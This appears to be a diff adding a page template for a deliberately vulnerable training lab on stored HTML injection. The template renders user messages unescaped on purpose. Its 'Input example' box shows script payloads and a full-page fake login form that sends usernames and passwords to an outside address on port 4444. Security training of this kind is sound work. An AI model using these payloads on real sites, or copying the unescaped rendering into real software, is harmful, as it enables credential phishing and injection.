@@ -1,0 +1,109 @@
+{{#> layout }}
+  {{#*inline "content"}}
+   
+    <h1>{{layout.title}}</h1>
+    <div>
+        <i>Цель: сохранить на странице свой HTML.</i>
+    </div>
+    <div style="border: 2px solid rgb(255, 251, 0); border-radius: 5px; background-color:rgb(222, 135, 215);width: 570px; padding: 10px">
+        <h3>Input example:</h3>
+    
+        <!-- &lt;h1&gt;Hi guys&lt;/h1&gt;
+        <br><br>
+        &lt;script&gt;alert('asdsadsad');&lt;/script&gt;
+        <br><br>
+        &lt;script&gt; 
+            document.body.insertAdjacentHTML("beforeEnd", `&lt;img src="https://owasp.org/assets/images/logo.png"&gt;&lt;/img&gt;`);     
+        &lt;/script&gt;
+        <br><br><br>
+
+        &lt;button class="button" id="you_need">Скидки&lt;/button&gt;
+        &lt;script&gt;
+        window.onload = function() { 
+            var script = document.createElement('script');
+            script.innerHTML = `document.getElementById("you_need").addEventListener( "click", function(e){
+                window.location.href = "https://owasp.org/";
+            });`;
+            document.body.appendChild(script);            
+            /*document.getElementById("you_need").click();*/
+        };
+        &lt;/script&gt;
+        <br><br><br>-->
+
+        &lt;div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index:1000; background-color:white; padding:1em;"&gt;Please login with valid 
+        credenitals:&lt;br&gt;&lt;form name="login" action="http://192.168.8.124:4444/login.htm"&gt;
+        &lt;table&gt;&lt;tr&gt;&lt;td&gt;Username:&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="username"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;
+        &lt;td&gt;&lt;input type="text" name="password"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
+        &lt;td colspan=2 align=center&gt;&lt;input type="submit" value="Login"/&gt;&lt;/td&gt;&lt;/tr&gt;
+        &lt;/table&gt;&lt;/form&gt;
+
+    </div>
+    <div>
+        
+        <ul id="messages">
+          {{#each msg}}
+            <!-- {{{expression}}} не экранирует спец. симолы -->
+            <li> user_id:{{this.user_id}} msg:{{{this.msg}}} </li>
+          {{/each}}
+        </ul>
+    </div>
+
+    <br>
+    <form action="/html-injection-saved-new-messages-form" method="post" name="form_new_msg" enctype="application/x-www-form-urlencoded"> <!-- text/plain application/x-www-form-urlencoded -->
+        <textarea id="new_messages" name="msg" rows="6" cols="70" required></textarea>
+        <input name="user_id" value="1" hidden required><br>
+        <input class="button" type="submit" value="Submit">
+    </form>
+    <button class="button" id="ajax_submit">AJAX Submit</button>
+
+    <script>
+        let ajax_submit = document.getElementById("ajax_submit");
+        ajax_submit.addEventListener('click',function(e){
+            let new_messages = document.getElementById("new_messages");
+            let user_id = 1; 
+            if (new_messages.value.length > 0){ 
+                async function new_msg(user_id,msg){ 
+                    const {data} = await axios.post('/html-injection-saved-new-messages', {user_id: user_id, msg: msg}, {
+                        headers: {
+                            'Content-Type': 'application/json'
+                        }
+                    });  
+                    new_messages.value = '';
+                    let messages = document.getElementById("messages");
+                    data.forEach(function(item, index, arr) { 
+                        messages.insertAdjacentHTML("beforeEnd", "<li>user_id:1 msg:" + item.msg + "</li>");
+                    });                    
+                }
+                new_msg(user_id, new_messages.value);
+            }
+        });
+
+
+        /*async function get_messages(user_id) {
+            try {
+                const {data} = await axios.post('/html-injection-saved-get-messages', {user_id: user_id}, {
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });    
+               
+                let messages = document.getElementById("messages");
+                data.forEach(function(item, index, arr) {
+                    messages.insertAdjacentHTML("beforeEnd", "<li>" + item.msg + "</li>");
+                });
+                return data ;            
+            } catch (error) {
+                console.error(error);
+            }
+        }
+        window.onload = function() {
+            // get_messages(1);
+             document.forms.form_new_msg.addEventListener('click',function(e){
+                 e.preventDefault();
+            }); 
+            
+        };*/
+         
+    </script>  
+  {{/inline}}
+{{/layout}}
